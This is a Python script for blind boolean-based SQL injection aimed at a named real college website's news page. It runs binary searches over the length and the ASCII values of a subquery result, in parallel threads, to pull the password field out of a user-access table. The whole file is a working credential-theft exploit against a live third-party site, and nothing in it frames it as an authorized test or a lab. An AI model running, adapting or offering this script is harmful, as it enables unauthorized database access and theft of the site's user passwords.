import requests
import threading

# ================= CONFIGURATION =================

BASE_URL = "http://www.simscollege.ac.in/news.php?id=52"

HEADERS = {
    "User-Agent": "Mozilla/5.0"
}

FOLLOW_REDIRECTS = True
MAX_CHAR_LENGTH = 50                    # Max length for output (used as upper bound)
NUM_THREADS = 5                         # Number of parallel threads

SQL_QUERY = "(select pwd from tbl_user_access limit 0,1)"  # 👈 You can change this to any dynamic SQL, like `user()` or `database()`

# =============== INTERNAL STATE ===============

result_chars = [''] * MAX_CHAR_LENGTH


# =============== CORE REQUEST FUNCTION ===============

def send_injected_payload(payload: str) -> bool:
    full_url = BASE_URL + requests.utils.quote(payload)
    try:
        response = requests.get(full_url, headers=HEADERS, allow_redirects=FOLLOW_REDIRECTS, timeout=100)
        content = response.text
        if 'No News Found.' in content:
            return False
        else:
            return True
    except Exception as e:
        print(f"[!] Error on payload: {payload} -> {str(e)}")
        return False


# =============== STEP 1: FIND LENGTH ===============

def find_length() -> int:
    low, high = 1, MAX_CHAR_LENGTH
    while low < high:
        mid = (low + high) // 2
        payload = f"' and length({SQL_QUERY})>{mid}-- -"
        if send_injected_payload(payload):
            low = mid + 1
        else:
            high = mid
    print(f"[+] Detected length of {SQL_QUERY}: {low}")
    return low


# =============== STEP 2: EXTRACT DATA CHAR-BY-CHAR ===============

def binary_search_char(pos: int):
    low, high = 32, 126  # Printable ASCII range
    while low < high:
        mid = (low + high) // 2
        payload = f"' and ascii(substr({SQL_QUERY},{pos},1))>{mid}-- -"
        if send_injected_payload(payload):
            low = mid + 1
        else:
            high = mid

    if 32 <= high <= 126:
        result_chars[pos - 1] = chr(high)
    else:
        result_chars[pos - 1] = ''

    # Show partial progress
    current = ''.join(c if c else '_' for c in result_chars)
    print(f"[{pos}] => {result_chars[pos - 1] or ' '} | Progress: {current}")



def extract_query_value(length: int):
    threads = []

    for i in range(1, length + 1):
        t = threading.Thread(target=binary_search_char, args=(i,))
        threads.append(t)
        t.start()

        # Wait if thread pool full
        if len(threads) >= NUM_THREADS:
            for thread in threads:
                thread.join()
            threads = []

    # Final cleanup
    for thread in threads:
        thread.join()

    final_value = ''.join([c for c in result_chars if c])
    print(f"\n[✓] Final extracted value of `{SQL_QUERY}`: {final_value}")


# ================= MAIN =================

if __name__ == "__main__":
    print(f"[*] Starting blind SQLi extractor for query: {SQL_QUERY}")
    length = find_length()
    result_chars = [''] * length
    extract_query_value(length)
